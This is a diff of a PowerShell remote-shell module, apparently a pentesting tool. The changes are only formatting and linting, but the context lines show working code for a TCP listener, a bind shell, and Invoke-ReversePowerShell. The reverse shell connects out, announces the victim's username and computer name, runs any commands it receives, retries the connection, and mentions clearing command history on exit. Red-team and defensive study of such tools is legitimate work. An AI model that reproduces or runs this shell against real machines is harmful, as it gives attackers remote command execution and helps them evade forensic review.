@@ -17,7 +17,7 @@
 
 .PARAMETERS
     -Port [<Int32>]
-        This parameter is for defining the listening port to connect too. 
+        This parameter is for defining the listening port to connect too.
         The cmdlet binds connections to the port that you specify.
             Required?                    false
             Position?                    0
@@ -63,7 +63,7 @@
 
 #>
 Function Start-Listener {
-    [CmdletBinding()]
+    [CmdletBinding(SupportsShouldProcess)]
         param(
             [Parameter(
                 Mandatory=$False,
@@ -77,7 +77,7 @@ Function Start-Listener {
     Write-Verbose "Defining listener object"
     $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port);
 
-    If($Null -eq $Socket)
+    If ($Null -eq $Socket)
     {
 
         Exit
@@ -87,16 +87,16 @@ Function Start-Listener {
     $PortString = $Port.ToString()
 
     Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
-    
+
     $Socket.Start()
-    Write-Output ("Listening on [0.0.0.0] (port " + $Port + ")") 
-    While ($true) 
+    Write-Output ("Listening on [0.0.0.0] (port " + $Port + ")")
+    While ($true)
     {
 
         Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
-        If ($Socket.Pending()) 
+        If ($Socket.Pending())
         {
-        
+
             $Client = $Socket.AcceptTcpClient()
 
             Break;
@@ -107,7 +107,7 @@ Function Start-Listener {
 
      }  # End While
 
-    Write-Host "[*] Connection Established." -ForegroundColor 'Green'
+    Write-Output "[*] Connection Established."
 
     Write-Verbose "Creating byte stream"
     $Stream = $Client.GetStream()
@@ -116,7 +116,7 @@ Function Start-Listener {
     $Encoding = New-Object -TypeName System.Text.AsciiEncoding
 
     Write-Verbose "Begin command execution loop"
-    Do 
+    Do
     {
 
         $Command = Read-Host
@@ -124,7 +124,7 @@ Function Start-Listener {
         $Writer.WriteLine($Command)
         $Writer.Flush();
 
-        If($Command -eq "exit")
+        If ($Command -eq "exit")
         {
 
             Write-Verbose "Exiting"
@@ -134,7 +134,7 @@ Function Start-Listener {
 
         $Read = $Null
 
-        While($Stream.DataAvailable -or $Null -eq $Read)
+        While ($Stream.DataAvailable -or $Null -eq $Read)
         {
 
             $Read = $Stream.Read($Buffer, 0, 2048)
@@ -221,7 +221,7 @@ Function Start-Listener {
 
 #>
 Function Start-Bind {
-    [CmdletBinding()]
+    [CmdletBinding(SupportsShouldProcess)]
         param(
             [Parameter(
                 Mandatory=$False,
@@ -240,21 +240,21 @@ Function Start-Bind {
 
         While ($True)
         {
-            
+
             Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
             If ($Listener.Pending())
             {
-            
+
                 $Client = $Listener.AcceptTcpClient()
-    
+
                 Break;
-    
+
             }  # End If
-    
+
             Start-Sleep -Seconds 1
-    
+
          }  # End While
-    
+
         Write-Output "[*] Connection Established."
         $Stream = $Client.GetStream()
 
@@ -267,9 +267,9 @@ Function Start-Bind {
        $Stream.Write($SendBytes,0,$SendBytes.Length)
 
         Write-Verbose "Begin command execution cycle"
-       While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+       While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
        {
-           
+
             $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
             $Data = $EncodedText.GetString($Bytes, 0, $i)
 
@@ -425,12 +425,12 @@ Function Invoke-ReversePowerShell {
             $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
             $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
 
-            While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
             {
 
                 $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)
 
-                If($Command.StartsWith("kill-link"))
+                If ($Command.StartsWith("kill-link"))
                 {
 
                     Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
@@ -457,7 +457,7 @@ Function Invoke-ReversePowerShell {
                     $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "
 
                 } # End Catch
-                
+
                 $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                 $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                 $Stream.Flush()
@@ -492,11 +492,11 @@ Function Invoke-ReversePowerShell {
 
             For ($Time; $Time -gt 0; $Time--)
             {
-            
+
                 $Text = "0:" + ($Time % 60) + " seconds left"
                 Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Time / $Length)
                 Start-Sleep -Seconds 1
-            
+
             }  # End For
 
         } # End Catch
